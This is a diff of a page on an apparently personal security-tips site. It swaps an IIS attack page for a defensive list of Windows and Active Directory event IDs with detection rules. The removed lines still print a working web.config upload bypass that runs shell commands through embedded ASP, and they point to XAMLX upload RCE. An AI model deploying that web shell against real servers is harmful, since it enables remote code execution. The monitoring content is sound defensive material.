@@ -10,14 +10,14 @@
   
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
-  <title>IIS - Security Tips</title>
+  <title>Event ID - Security Tips</title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
   
   <script>
     // Current page data
-    var mkdocs_page_name = "IIS";
-    var mkdocs_page_input_path = "iis.md";
-    var mkdocs_page_url = "/iis/";
+    var mkdocs_page_name = "Event ID";
+    var mkdocs_page_input_path = "eventid.md";
+    var mkdocs_page_url = "/eventid/";
   </script>
    
 </head>
@@ -85,15 +85,30 @@
           
           <li class="bold">
 		        
-    <span class="section-link ">Windows</span>
+    <span class="section-link active">Windows</span>
     <ul>
                 <li class="">
                     
     <a class="section-link" href="../windows/">Genral</a>
                 </li>
-                <li class="">
+                <li class="active">
                     
-    <a class="section-link" href="../eventid/">Event ID</a>
+    <a class="section-link" href="./">Event ID</a>
+    <ul>
+            
+    
+    <ul>
+    
+        <li><a class="" href="#event-id">Event ID</a></li>
+    
+        <li><a class="" href="#detection-rules">Detection Rules</a></li>
+    
+        <li><a class="" href="#source">Source:</a></li>
+    
+    </ul>
+    
+
+    </ul>
                 </li>
                 <li class="">
                     
@@ -134,7 +149,7 @@
           
           <li class="bold">
 		        
-    <span class="section-link active">Web</span>
+    <span class="section-link ">Web</span>
     <ul>
                 <li class="">
                     
@@ -164,24 +179,9 @@
                     
     <a class="section-link" href="../jwt/">JWT</a>
                 </li>
-                <li class="active">
+                <li class="">
                     
-    <a class="section-link" href="./">IIS</a>
-    <ul>
-            
-    
-    <ul>
-    
-        <li><a class="" href="#bypass-blacklist-upload">Bypass blacklist upload</a></li>
-    
-        <li><a class="" href="#upload-xamlx-file-to-get-rce">Upload XAMLX file to get RCE</a></li>
-    
-        <li><a class="" href="#tracing">Tracing</a></li>
-    
-    </ul>
-    
-
-    </ul>
+    <a class="section-link" href="../iis/">IIS</a>
                 </li>
                 <li class="">
                     
@@ -324,49 +324,155 @@
         <div role="main">
           <div class="section">
             
-              <h1 id="iis">IIS</h1>
-<h2 id="bypass-blacklist-upload">Bypass blacklist upload</h2>
-<p>It's possible to bypass blacklist upload while uploading a <code>web.config</code> file.
-For this, you need to set execution rights to <code>.config</code> and then adding <code>ASP</code> code
-in the <code>web.config</code>.</p>
-<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;configuration&gt;
-   &lt;system.webServer&gt;
-      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
-         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;
-      &lt;/handlers&gt;
-      &lt;security&gt;
-         &lt;requestFiltering&gt;
-            &lt;fileExtensions&gt;
-               &lt;remove fileExtension=&quot;.config&quot; /&gt;
-            &lt;/fileExtensions&gt;
-            &lt;hiddenSegments&gt;
-               &lt;remove segment=&quot;web.config&quot; /&gt;
-            &lt;/hiddenSegments&gt;
-         &lt;/requestFiltering&gt;
-      &lt;/security&gt;
-   &lt;/system.webServer&gt;
-   &lt;appSettings&gt;
-&lt;/appSettings&gt;
-&lt;/configuration&gt;
-&lt;!–-
-&lt;% Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;)
-Response.write(&quot;&lt;pre&gt;&quot;)
-Set wShell1 = CreateObject(&quot;WScript.Shell&quot;)
-Set cmd1 = wShell1.Exec(&quot;whoami&quot;)
-output1 = cmd1.StdOut.Readall()
-set cmd1 = nothing: Set wShell1 = nothing
-Response.write(output1)
-Response.write(&quot;&lt;/pre&gt;&lt;!-&quot;&amp;&quot;-&quot;) %&gt;
--–&gt;
-</code></pre>
-
-<h2 id="upload-xamlx-file-to-get-rce">Upload XAMLX file to get RCE</h2>
-<p><a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/august/getting-shell-with-xamlx-files/" target="_blank">NCCGroup</a>
-describes how to upload a <code>XAMLX</code> file to execute code on a remote IIS server.</p>
-<h2 id="tracing">Tracing</h2>
-<p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/ms972204(v=msdn.10)?redirectedfrom=MSDN" target="_blank">Tracing</a>
-might be activate on the server. For example, check <code>/trace.axd</code>.</p>
+              <h1 id="windows-events-to-monitor">Windows Events to Monitor</h1>
+<h2 id="event-id">Event ID</h2>
+<p>The following table lists the event you should monitor on an Active Directory to
+detect an attacks.</p>
+<table>
+<thead>
+<tr>
+<th align="center">Event ID</th>
+<th align="left">Summary</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">4618</td>
+<td align="left">A monitored security event pattern has occurred.</td>
+</tr>
+<tr>
+<td align="center">4624</td>
+<td align="left">An account was successfully logged on.</td>
+</tr>
+<tr>
+<td align="center">4625</td>
+<td align="left">An account failed to log on.</td>
+</tr>
+<tr>
+<td align="center">4648</td>
+<td align="left">A logon was attempted using explicit credentials.</td>
+</tr>
+<tr>
+<td align="center">4649</td>
+<td align="left">A replay attack was detected. May be a harmless false positive due to misconfiguration error.</td>
+</tr>
+<tr>
+<td align="center">4662</td>
+<td align="left">An operation was performed on an object.</td>
+</tr>
+<tr>
+<td align="center">4692</td>
+<td align="left">Backup of data protection master key was attempted.</td>
+</tr>
+<tr>
+<td align="center">4706</td>
+<td align="left">A new trust was created to a domain.</td>
+</tr>
+<tr>
+<td align="center">4707</td>
+<td align="left">A trust to a domain was removed.</td>
+</tr>
+<tr>
+<td align="center">4716</td>
+<td align="left">Trusted domain information was modified.</td>
+</tr>
+<tr>
+<td align="center">4719</td>
+<td align="left">System audit policy was changed.</td>
+</tr>
+<tr>
+<td align="center">4738</td>
+<td align="left">A user account was changed.</td>
+</tr>
+<tr>
+<td align="center">4765</td>
+<td align="left">SID History was added to an account.</td>
+</tr>
+<tr>
+<td align="center">4766</td>
+<td align="left">An attempt to add SID History to an account failed.</td>
+</tr>
+<tr>
+<td align="center">4768</td>
+<td align="left">A Kerberos authentication ticket (TGT) was requested.</td>
+</tr>
+<tr>
+<td align="center">4769</td>
+<td align="left">A Kerberos service ticket was requested.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="detection-rules">Detection Rules</h2>
+<h3 id="brute-force-attack-on-one-account">Brute force attack on one account</h3>
+<ul>
+<li>Event ID: 4625</li>
+<li>Rule: <code>X</code> number of failed logins in <code>Y</code> minutes with the same username</li>
+</ul>
+<h3 id="non-allowed-accounts-logon">Non allowed accounts logon</h3>
+<ul>
+<li>Event ID: 4624</li>
+<li>Rule: Check the <a href="http://techgenix.com/logon-types/" target="_blank">LogonType</a> (<code>2</code> or <code>10</code>) and the username</li>
+</ul>
+<h3 id="sid-history-modification">SID History modification</h3>
+<ul>
+<li>Event ID: 4765, 4766</li>
+<li>ANSSI: <a href="https://www.cert.ssi.gouv.fr/uploads/guide-ad.html#sidhistory_dangerous" target="_blank">sidhistory_dangerous</a></li>
+</ul>
+<h3 id="an-account-primarygroupid-was-changed-with-value-lower-than-1000">An account primaryGroupId was changed with value lower than 1000</h3>
+<ul>
+<li>Event ID: 4738</li>
+<li>ANSSI: <a href="https://www.cert.ssi.gouv.fr/uploads/guide-ad.html#primary_group_id_1000" target="_blank">primary_group_id_1000</a></li>
+</ul>
+<h3 id="kerberoasting-detection">Kerberoasting detection</h3>
+<ul>
+<li>Event ID: 4769</li>
+<li>Rule:<ul>
+<li><a href="https://adsecurity.org/?p=3458" target="_blank">Filter out</a> <code>Ticket Options: 0x40810000</code> or <code>Ticket Encryption: 0x01</code>, <code>0x02</code>, <code>0x03</code> or <code>0x17</code></li>
+<li><code>X</code> Kerberos service ticket requests withing <code>Y</code> minutes with the same username</li>
+</ul>
+</li>
+</ul>
+<h3 id="logon-on-a-domain-controller">Logon on a Domain Controller</h3>
+<ul>
+<li>Event ID: 4624</li>
+<li>Rule:<ul>
+<li>Check the <a href="http://techgenix.com/logon-types/" target="_blank">LogonType</a> (<code>2</code>)</li>
+<li>Check the LogonTarget</li>
+<li>Check the username or user groups</li>
+</ul>
+</li>
+</ul>
+<h3 id="domain-structure-modification">Domain structure modification</h3>
+<ul>
+<li>Event ID:<ul>
+<li>4706: Trust added</li>
+<li>4707: Trust removed</li>
+<li>4716: Trust modified</li>
+</ul>
+</li>
+</ul>
+<h3 id="dpapi-key">DPAPI key</h3>
+<h4 id="dpapi-backup-key-extraction">DPAPI backup key extraction</h4>
+<ul>
+<li>Event ID: 4662</li>
+<li>Rule:<ul>
+<li>Check the ObjectType: <code>SecretObject</code></li>
+<li>Check AccessMask: <code>0x02</code></li>
+<li>Check ObjectName: <code>BCKUPKEY</code></li>
+</ul>
+</li>
+<li>ANSSI: <a href="https://www.cert.ssi.gouv.fr/uploads/guide-ad.html#permissions_dpapi" target="_blank">permissions_dpapi</a></li>
+</ul>
+<h4 id="dpapi-backup-key-backup">DPAPI backup key backup</h4>
+<ul>
+<li>Event ID: 4692</li>
+<li>ANSSI: <a href="https://www.cert.ssi.gouv.fr/uploads/guide-ad.html#permissions_dpapi" target="_blank">permissions_dpapi</a></li>
+</ul>
+<h2 id="source">Source:</h2>
+<ul>
+<li><a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor" target="_blank">Microsoft Appendix L: Events to Monitor</a></li>
+<li><a href="https://www.cert.ssi.gouv.fr/uploads/guide-ad.html" target="_blank">ANSSI AD guide</a></li>
+</ul>
             
           </div>
           <footer>
@@ -385,10 +491,10 @@ might be activate on the server. For example, check <code>/trace.axd</code>.</p>
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../jwt/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../windows/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../nginx/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../powershell/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
